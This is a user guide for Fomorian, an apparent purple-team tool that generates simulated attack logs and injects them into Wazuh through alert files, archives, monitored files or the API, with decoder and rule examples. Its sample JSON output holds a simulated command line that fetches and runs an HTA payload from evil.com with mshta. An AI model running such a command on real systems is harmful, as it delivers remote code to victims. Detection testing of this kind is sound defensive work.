# Fomorian SIEM Import Guide

This guide explains how to import Fomorian attack scenarios into Wazuh. Fomorian supports multiple injection methods for different Wazuh deployment types.

## Table of Contents

1. [Quick Start](#quick-start)
2. [Wazuh Injection Methods](#wazuh-injection-methods)
3. [Output Formats](#output-formats)
4. [Troubleshooting](#troubleshooting)

---

## Quick Start

```bash
# Detect your Wazuh installation
fomorian detect-wazuh

# Generate and inject into Wazuh (recommended for local installs)
fomorian generate \
  --config ./my-config \
  --engagement ransomware \
  --inject wazuh \
  --inject-method alerts

# Or inject existing scenario
fomorian inject ./scenario.json --siem wazuh --inject-method alerts
```

---

## Wazuh Injection Methods

Fomorian supports multiple injection methods depending on your Wazuh deployment:

| Method | Best For | Requirements |
|--------|----------|--------------|
| `alerts` | Local Wazuh + Filebeat → SIEM | Write access to alerts.json |
| `archives` | Local Wazuh with archives enabled | Write access to archives.json |
| `file` | Agent-only deployments | ossec.conf localfile setup |
| `api` | Remote Wazuh Manager | API credentials |
| `auto` | Any deployment | Auto-detects best method |

### Method 1: Alerts Injection (Recommended)

Writes logs directly to `/var/ossec/logs/alerts/alerts.json`. Works when Filebeat forwards alerts to your SIEM (Graylog, OpenSearch, Splunk, etc.).

```bash
fomorian generate \
  --config ./config \
  --engagement ransomware \
  --inject wazuh \
  --inject-method alerts
```

### Method 2: Archives Injection

Writes to `/var/ossec/logs/archives/archives.json`. Requires archives to be enabled in ossec.conf.

```bash
fomorian generate \
  --config ./config \
  --engagement ransomware \
  --inject wazuh \
  --inject-method archives
```

### Method 3: File-Based Injection

Write logs to a monitored file. Most compatible with agent-only deployments.

1. **Create log directory** on Wazuh manager:
   ```bash
   mkdir -p /var/log/purple-team
   chown wazuh:wazuh /var/log/purple-team
   ```

2. **Add to `/var/ossec/etc/ossec.conf`**:
   ```xml
   <localfile>
     <log_format>json</log_format>
     <location>/var/log/purple-team/attacks.json</location>
     <label key="purple_team">true</label>
   </localfile>
   ```

3. **Restart Wazuh manager**:
   ```bash
   systemctl restart wazuh-manager
   ```

4. **Generate and inject**:
   ```bash
   fomorian generate \
     --config ./config \
     --engagement ransomware \
     --inject wazuh \
     --inject-method file
   ```

### Method 4: Wazuh API Injection

For remote injection via the Wazuh Manager API.

```bash
fomorian generate \
  --config ./config \
  --engagement ransomware \
  --inject wazuh \
  --inject-method api \
  --siem-host wazuh-manager.example.com \
  --siem-port 55000 \
  --siem-user wazuh-wui \
  --siem-password YOUR_PASSWORD
```

### Custom Decoder

Optionally create `/var/ossec/etc/decoders/purple-team-decoder.xml`:

```xml
<decoder name="fomorian">
  <prematch>^{"_purple_team":</prematch>
  <plugin_decoder>JSON_Decoder</plugin_decoder>
</decoder>
```

### Custom Detection Rules

Optionally create `/var/ossec/etc/rules/purple-team-rules.xml`:

```xml
<group name="purple_team,attack_simulation">
  <rule id="100100" level="10">
    <decoded_as>fomorian</decoded_as>
    <description>Purple Team: $(attack_phase) - $(technique)</description>
    <mitre>
      <id>$(technique)</id>
    </mitre>
  </rule>
</group>
```

---

## Output Formats

### JSON (Default)

```bash
fomorian generate -c ./config -e ransomware -f json -o ./scenario.json
```

Structure:
```json
{
  "_metadata": {
    "scenario_name": "Ransomware - Corp",
    "engagement_type": "ransomware",
    "total_logs": 19,
    "techniques_used": ["T1566.001", "T1059.001", "T1486"]
  },
  "logs": [
    {
      "sequence": 1,
      "timestamp": "2026-01-29T09:15:23.456Z",
      "attack_phase": "initial-access",
      "technique": "T1566.001",
      "host": "WS01",
      "log": {
        "winlog": {
          "event_id": 1,
          "event_data": {
            "CommandLine": "cmd.exe /c mshta http://evil.com/payload.hta"
          }
        }
      }
    }
  ]
}
```

### NDJSON (Streaming)

```bash
fomorian generate -c ./config -e ransomware -f ndjson -o ./scenario.ndjson
```

Each line is a complete JSON log - ideal for file monitoring.

### Split by Phase

```bash
fomorian generate -c ./config -e ransomware -f split -o ./scenario-dir
```

Creates separate files per attack phase.

---

## Troubleshooting

### Detecting Your Installation

```bash
fomorian detect-wazuh --show-instructions
```

This will detect:
- Docker vs native installation
- Manager vs agent-only
- Available injection methods

### Connection Issues

```bash
# Test Wazuh API
curl -k -X GET "https://wazuh-manager:55000/security/user/authenticate" \
  -H "Authorization: Basic $(echo -n 'wazuh-wui:password' | base64)"

# Check if alerts.json is writable (Docker)
docker exec wazuh-manager ls -la /var/ossec/logs/alerts/

# Check if Filebeat is forwarding
docker logs filebeat 2>&1 | tail -20
```

### Logs Not Appearing in SIEM

1. **Check Filebeat configuration** - Ensure `alerts.json` is being monitored:
   ```yaml
   # In filebeat.yml
   filebeat.inputs:
     - type: log
       paths:
         - /var/ossec/logs/alerts/alerts.json
   ```

2. **Check if logs are written**:
   ```bash
   docker exec wazuh-manager tail -5 /var/ossec/logs/alerts/alerts.json
   ```

3. **Check decoder field** - Fomorian logs should have `decoder.name: fomorian`

### Sigma Rules Not Firing

1. **Verify field names** - Check if `filebeat_data_win_eventdata_*` fields exist in your SIEM
2. **Check pipeline order** - Normalization must run before Sigma rules
3. **Check Sigma rule syntax** - Some rules have broken logic. See [sigma-rule-fixes/](sigma-rule-fixes/)

### Environment Variables

```bash
# Add to ~/.bashrc or ~/.zshrc
export PURPLE_TEAM_HOST=wazuh-manager.local
export PURPLE_TEAM_PORT=55000
export PURPLE_TEAM_USERNAME=wazuh-wui
export PURPLE_TEAM_PASSWORD=your-password
```

---

## Support

- GitHub: https://github.com/pookasecteam/fomorian-community/issues
- [Wazuh Documentation](https://documentation.wazuh.com/)
